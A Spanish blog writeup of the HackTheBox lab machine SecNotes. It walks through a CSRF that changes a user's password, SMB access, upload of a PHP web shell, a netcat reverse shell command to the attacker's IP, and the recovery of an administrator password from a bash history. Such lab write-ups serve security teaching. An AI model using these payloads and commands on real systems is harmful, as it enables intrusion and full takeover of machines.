---
date: 2023-07-31 12:00:00
layout: post
title: SecNotes Writeup
subtitle: Writeup de la máquina SecNotes de la plataforma HackTheBox
description: En esta máquina nos aprovechamos de un CSRF para utilizar una función de la web. Además de los elevados permisos de un usuario en una carpeta. En la escalada podemos encontrar información privilegiada sin tener muchos permisos. Esta máquina tiene una dificultad medium.
image: /assets/img/machines/SecNotes/SecNotes.png
optimized_image: /assets/img/machines/SecNotes/SecNotes.png
category: Writeup
tags:
  - HackTheBox
  - Writeup
  - Windows
  - Medium
  - File Upload
  - Samba
  - CSRF
  
author: FredBrave
---
# Enumeración
Empezamos como siempre con dos escaneos de nmap, el primero rápido para conseguir solo los puertos abiertos y el segundo uno más exhaustivo para conocer las versiones y servicios que corren por los puertos.

```bash
❯ sudo nmap -p- --open -sS --min-rate 2000 -n -Pn 10.129.145.213 -oG Targeted
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-31 10:22 EDT
Nmap scan report for 10.129.145.213
Host is up (0.12s latency).
Not shown: 65532 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
80/tcp   open  http
445/tcp  open  microsoft-ds
8808/tcp open  ssports-bcast

Nmap done: 1 IP address (1 host up) scanned in 94.72 seconds

❯ sudo nmap -p80,445,8808 -sCV 10.129.145.213 -oN Target
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-31 10:32 EDT
Nmap scan report for 10.129.145.213
Host is up (0.15s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
| http-title: Secure Notes - Login
|_Requested resource was login.php
|_http-server-header: Microsoft-IIS/10.0
445/tcp  open         Windows 10 Enterprise 17134 microsoft-ds (workgroup: HTB)
8808/tcp open  http    Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows
| http-methods: 
|_  Potentially risky methods: TRACE
Service Info: Host: SECNOTES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-07-31T14:33:18
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows 10 Enterprise 17134 (Windows 10 Enterprise 6.3)
|   OS CPE: cpe:/o:microsoft:windows_10::-
|   Computer name: SECNOTES
|   NetBIOS computer name: SECNOTES\x00
|   Workgroup: HTB\x00
|_  System time: 2023-07-31T07:33:17-07:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: mean: 2h20m01s, deviation: 4h02m31s, median: 0s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 60.49 seconds
```
Encontramos los puertos 80,445 y 8808 abiertos, el 80 y 8808 son puertos http mientras el 445 es un smb. Empezaremos enumerando el puerto 80.

# 80 Secure Notes
<img class="img" src="/assets/img/machines/SecNotes/1.png" width="800">

Hay un login del cual no tenemos credenciales, pero también vemos la opción de crearnos una cuenta por lo que seguiremos por ahí.

<img class="img" src="/assets/img/machines/SecNotes/2.png" width="800">

Nos logueamos con nuestra cuenta y empezamos a enumerar mejor la web.

<img class="img" src="/assets/img/machines/SecNotes/3.png" width="1200">

# Funciones de la Web

Esta web tiene las siguientes funciones.

# New Note

<img class="img" src="/assets/img/machines/SecNotes/4.png" width="800">

Podemos crear notas las cuales podemos visualizar luego en el Dashboard de la web.

<img class="img" src="/assets/img/machines/SecNotes/5.png" width="1400">

# Change Password

<img class="img" src="/assets/img/machines/SecNotes/6.png" width="800">

Podemos cambiar la clave de nuestra cuenta.

Al realizar la opción se lanza una petición `POST` con los siguientes datos.

<img class="img" src="/assets/img/machines/SecNotes/7.png" width="800">

# Contact Us

En esta función podemos tratar de enviar un mensaje al administrador de la web.

<img class="img" src="/assets/img/machines/SecNotes/8.png" width="800">

# CSRF (Cross-site request forgery)

Después de probar algunas cosas encuentro que puedo realizar un CSRF en la función `Contact Us`.

<img class="img" src="/assets/img/machines/SecNotes/9.png" width="800">

```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.145.213 - - [31/Jul/2023 11:14:20] "GET / HTTP/1.1" 200 -
```
Analizándolo más encuentro que al parecer si tiene alguna dirección http parece mandar automáticamente una petición hacia este.

Trato de aprovecharme de esto cambiando la clave de tyler, cambiaré la petición `POST` de la función `Change Password` a una `GET`, para que pueda cambiar la clave de Tyler por otra.

<img class="img" src="/assets/img/machines/SecNotes/10.png" width="1000">

Una vez hecho me logeo como Tyler.

<img class="img" src="/assets/img/machines/SecNotes/11.png" width="1200">

Revisando las notas de tyler encuentra la siguiente información.

<img class="img" src="/assets/img/machines/SecNotes/12.png" width="600">

# Shell como Tyler

La nota parece ser una clave y usuario por lo que intentaré usarla en el smb.

```bash
❯ smbmap -H 10.129.145.213 -u tyler -p '92g!mA8BGjOirkL%OG*&'
[+] IP: 10.129.145.213:445      Name: 10.129.145.213                                    
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        new-site                                                READ, WRITE
```

Tenemos acceso a con permisos de escritura y lectura en la carpeta `new_site`.

```bash
❯ smbmap -H 10.129.145.213 -u tyler -p '92g!mA8BGjOirkL%OG*&' -r new-site
[+] IP: 10.129.145.213:445      Name: 10.129.145.213                                    
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        new-site                                                READ, WRITE
        .\new-site\*
        dr--r--r--                0 Mon Jul 31 11:42:06 2023    .
        dr--r--r--                0 Mon Jul 31 11:42:06 2023    ..
        fr--r--r--              696 Thu Jun 21 16:15:36 2018    iisstart.htm
        fr--r--r--            98757 Thu Jun 21 16:15:38 2018    iisstart.png
```

Revisando la página en el puerto 8808 me encuentro solo con lo siguiente.

<img class="img" src="/assets/img/machines/SecNotes/13.png" width="1200">

Debido al contenido de la web y de la carpeta además de su nombre `new_site` puedo suponer que tengo acceso a la carpeta en donde se almacena la web con permisos de escritura por lo que intentaré subir una shell.

```bash
❯ /usr/bin/cat cmd.php
<?php system($_REQUEST['cmd']); ?>
❯ smbclient -U 'tyler%92g!mA8BGjOirkL%OG*&' //10.129.145.213/new-site -c 'put cmd.php'
putting file cmd.php as \cmd.php (0.1 kb/s) (average 0.1 kb/s)
❯ curl -X GET http://10.129.145.213:8808/cmd.php\?cmd\=whoami
secnotes\tyler
```
Ahora intentaré subir el nc.exe y mandarme una shell hacia mí.

```bash
❯ locate nc.exe
/usr/share/windows-resources/binaries/nc.exe
❯ cp /usr/share/windows-resources/binaries/nc.exe .
❯ smbclient -U 'tyler%92g!mA8BGjOirkL%OG*&' //10.129.145.213/new-site -c 'put nc.exe'
putting file nc.exe as \nc.exe (63.7 kb/s) (average 63.7 kb/s)
❯ curl "http://10.129.145.213:8808/cmd.php\?cmd\=nc.exe+-e+cmd.exe+10.10.16.31+443"
...

❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.31] from (UNKNOWN) [10.129.145.213] 53648
Microsoft Windows [Version 10.0.17134.228]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\inetpub\new-site>whoami
whoami
secnotes\tyler
```
# Shell como Administrator

Enumerando encuentro un link simbólico hacia bash.

```bash
C:\Users\tyler\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 1E7B-9B76

 Directory of C:\Users\tyler\Desktop

08/19/2018  03:51 PM    <DIR>          .
08/19/2018  03:51 PM    <DIR>          ..
06/22/2018  03:09 AM             1,293 bash.lnk
08/02/2021  03:32 AM             1,210 Command Prompt.lnk
04/11/2018  04:34 PM               407 File Explorer.lnk
06/21/2018  05:50 PM             1,417 Microsoft Edge.lnk
06/21/2018  09:17 AM             1,110 Notepad++.lnk
07/31/2023  07:18 AM                34 user.txt
08/19/2018  10:59 AM             2,494 Windows PowerShell.lnk
               7 File(s)          7,965 bytes
               2 Dir(s)  13,895,610,368 bytes free
```
Además una ruta `Distros\Ubuntu`.

```bash
C:\Distros\Ubuntu>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 1E7B-9B76

 Directory of C:\Distros\Ubuntu

06/21/2018  05:59 PM    <DIR>          .
06/21/2018  05:59 PM    <DIR>          ..
07/11/2017  06:10 PM           190,434 AppxBlockMap.xml
07/11/2017  06:10 PM             2,475 AppxManifest.xml
06/21/2018  03:07 PM    <DIR>          AppxMetadata
07/11/2017  06:11 PM            10,554 AppxSignature.p7x
06/21/2018  03:07 PM    <DIR>          Assets
06/21/2018  03:07 PM    <DIR>          images
07/11/2017  06:10 PM       201,254,783 install.tar.gz
07/11/2017  06:10 PM             4,840 resources.pri
06/21/2018  05:51 PM    <DIR>          temp
07/11/2017  06:10 PM           222,208 ubuntu.exe
07/11/2017  06:10 PM               809 [Content_Types].xml
               7 File(s)    201,686,103 bytes
               6 Dir(s)  13,895,598,080 bytes free
```
# Ejecutar bash.exe

Primero intentare encontrar la ruta absoluta de bash.exe

```bash
C:\Distros\Ubuntu>where /R c:\ bash.exe
where /R c:\ bash.exe
c:\Windows\WinSxS\amd64_microsoft-windows-lxss-bash_31bf3856ad364e35_10.0.17134.1_none_251beae725bc7de5\bash.exe
```
Lo ejecutamos.

```bash
C:\Distros\Ubuntu>c:\Windows\WinSxS\amd64_microsoft-windows-lxss-bash_31bf3856ad364e35_10.0.17134.1_none_251beae725bc7de5\bash.exe     
c:\Windows\WinSxS\amd64_microsoft-windows-lxss-bash_31bf3856ad364e35_10.0.17134.1_none_251beae725bc7de5\bash.exe
mesg: ttyname failed: Inappropriate ioctl for device
whoami
root
python -c "import pty;pty.spawn('/bin/bash')"
root@SECNOTES:~# ls
ls
filesystem
root@SECNOTES:~#
```
Al buscar en este me encuentro lo siguiente en el bash\_history.

```bash
root@SECNOTES:~# ls -la
ls -la
total 8
drwx------ 1 root root  512 Jun 22  2018 .
drwxr-xr-x 1 root root  512 Jun 21  2018 ..
---------- 1 root root  398 Jun 22  2018 .bash_history
-rw-r--r-- 1 root root 3112 Jun 22  2018 .bashrc
-rw-r--r-- 1 root root  148 Aug 17  2015 .profile
drwxrwxrwx 1 root root  512 Jun 22  2018 filesystem
root@SECNOTES:~# cat .bash_history
cat .bash_history
cd /mnt/c/
ls
cd Users/
cd /
cd ~
ls
pwd
mkdir filesystem
mount //127.0.0.1/c$ filesystem/
sudo apt install cifs-utils
mount //127.0.0.1/c$ filesystem/
mount //127.0.0.1/c$ filesystem/ -o user=administrator
cat /proc/filesystems
sudo modprobe cifs
smbclient
apt install smbclient
smbclient
smbclient -U 'administrator%u6!4ZwgwOM#^OBf#Nwnh' \\\\127.0.0.1\\c$
> .bash_history 
less .bash_history
```
Tenemos la posible clave de administrator.

Intentamos logearnos como Administrator con la herramienta winexe.

```bash
❯ winexe -U '.\administrator%u6!4ZwgwOM#^OBf#Nwnh' //10.129.145.213 cmd.exe
Microsoft Windows [Version 10.0.17134.228]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>whoami
whoami
secnotes\administrator
```
Hemos pwneado la maquina!
